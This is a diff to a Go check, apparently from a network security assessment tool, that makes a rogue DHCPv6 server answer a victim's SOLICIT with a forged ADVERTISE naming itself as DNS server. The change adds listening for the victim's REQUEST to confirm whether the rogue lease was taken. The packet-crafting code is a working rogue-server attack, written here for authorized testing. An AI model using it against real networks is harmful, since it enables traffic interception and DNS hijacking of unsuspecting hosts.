@@ -13,6 +13,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net"
+	"time"
 
 	"github.com/gopacket/gopacket"
 	"github.com/gopacket/gopacket/layers"
@@ -60,15 +61,23 @@ func solicitFrom(data []byte, client net.HardwareAddr) (*layers.DHCPv6, check.Ho
 	return nil, check.Host{}
 }
 
+// serverDUID is the DUID the rogue server answers with: the link-layer
+// type (1), hardware type Ethernet (1), and the attack leg's MAC.
+func serverDUID(src net.HardwareAddr) []byte {
+	return append([]byte{0x00, 0x01, 0x00, 0x01}, src...)
+}
+
 // RunRogueDHCPv6 waits for the window for a SOLICIT from the target's IPv6
 // victim MAC on the attack leg and answers it with an ADVERTISE to the
 // host the SOLICIT came from, from the target's IPv6 server address,
-// which is also the DNS server it offers. The leased address, the
-// lifetimes, and the IAID are probe content. The verdict is pending: when
-// the window ends without a SOLICIT nothing was sent, and after the
-// ADVERTISE whether the client took the lease needs a REQUEST listener it
-// does not have. Cancellation while waiting returns ctx.Err(). A terminal
-// receive error comes back wrapped.
+// which is also the DNS server it offers, then waits for the victim's
+// REQUEST. The leased address, the lifetimes, and the IAID are probe
+// content. The predicate is the REQUEST's Server Identifier option (RFC
+// 8415 sections 16.4 and 18.2.2): one naming the attack leg's DUID
+// confirms, one naming another DUID resists, none after the ADVERTISE
+// resists, and no SOLICIT within the window is pending with nothing sent,
+// the detail reading the time listened. Cancellation while waiting
+// returns ctx.Err(). A terminal receive error comes back wrapped.
 func RunRogueDHCPv6(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 	if err := deps.Target.Need(check.FieldVictim6, check.FieldVictim6MAC, check.FieldServer6); err != nil {
 		return check.Verdict{}, err
@@ -76,7 +85,7 @@ func RunRogueDHCPv6(ctx context.Context, deps check.Deps) (check.Verdict, error)
 	src := deps.AttackLeg.Addr().MAC
 	client := deps.Target.Victim6.MAC
 
-	frame, _, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
+	frame, pre, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
 		solicit, _ := solicitFrom(data, client)
 		return solicit != nil
 	})
@@ -84,7 +93,7 @@ func RunRogueDHCPv6(ctx context.Context, deps check.Deps) (check.Verdict, error)
 		return check.Verdict{}, errs.Wrap(err, "roguedhcp6: receive solicit")
 	}
 	if frame == nil {
-		return check.Pending(fmt.Sprintf("no solicit in %v", deps.Observe)), nil
+		return check.Pending(fmt.Sprintf("no solicit in %s", pre.Elapsed.Round(time.Millisecond))), nil
 	}
 	solicit, from := solicitFrom(frame, client)
 
@@ -115,7 +124,28 @@ func RunRogueDHCPv6(ctx context.Context, deps check.Deps) (check.Verdict, error)
 	})
 	deps.Emitter.Finding("dhcpv6", detail)
 
-	return check.Pending("no observable: lease acceptance needs a REQUEST listener"), nil
+	var requested []byte
+	request, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe-pre.Elapsed, func(data []byte) bool {
+		_, duid, ok := isRequest6Naming(data, client)
+		if ok {
+			requested = duid
+		}
+		return ok
+	})
+	if err != nil {
+		if ctx.Err() != nil {
+			return check.Verdict{}, ctx.Err()
+		}
+		return check.Verdict{}, errs.Wrap(err, "roguedhcp6: receive request")
+	}
+	observed := pre.Elapsed + obs.Elapsed
+	switch {
+	case request == nil:
+		return check.Resisted("the client did not request the lease", observed), nil
+	case bytes.Equal(requested, serverDUID(src)):
+		return check.Confirmed(fmt.Sprintf("the client requested %s from the attack leg", leaseAddr), observed), nil
+	}
+	return check.Resisted(fmt.Sprintf("the client requested from server DUID %x", requested), observed), nil
 }
 
 // craftDHCPv6Advertise builds a DHCPv6 ADVERTISE from the rogue server.
@@ -138,9 +168,6 @@ func craftDHCPv6Advertise(src net.HardwareAddr, serverIP net.IP, client check.Ho
 	}
 	_ = udp.SetNetworkLayerForChecksum(ip)
 
-	// Server DUID (LL type): type=1(LL), hwtype=1(eth), MAC.
-	serverDUID := append([]byte{0x00, 0x01, 0x00, 0x01}, src...)
-
 	// IA_NA with IAAddr: IAID(4)+T1(4)+T2(4) + IAAddr option(4+16+4+4)
 	iaNAWithAddr := make([]byte, 12+4+16+4+4)
 	binary.BigEndian.PutUint32(iaNAWithAddr[0:4], 0x00000001) // IAID
@@ -159,7 +186,7 @@ func craftDHCPv6Advertise(src net.HardwareAddr, serverIP net.IP, client check.Ho
 		MsgType:       layers.DHCPv6MsgTypeAdvertise,
 		TransactionID: xid,
 		Options: layers.DHCPv6Options{
-			layers.NewDHCPv6Option(layers.DHCPv6OptServerID, serverDUID),
+			layers.NewDHCPv6Option(layers.DHCPv6OptServerID, serverDUID(src)),
 			layers.NewDHCPv6Option(layers.DHCPv6OptClientID, clientDUID),
 			layers.NewDHCPv6Option(layers.DHCPv6OptIANA, iaNAWithAddr),
 			layers.NewDHCPv6Option(layers.DHCPv6OptStatusCode, statusData),
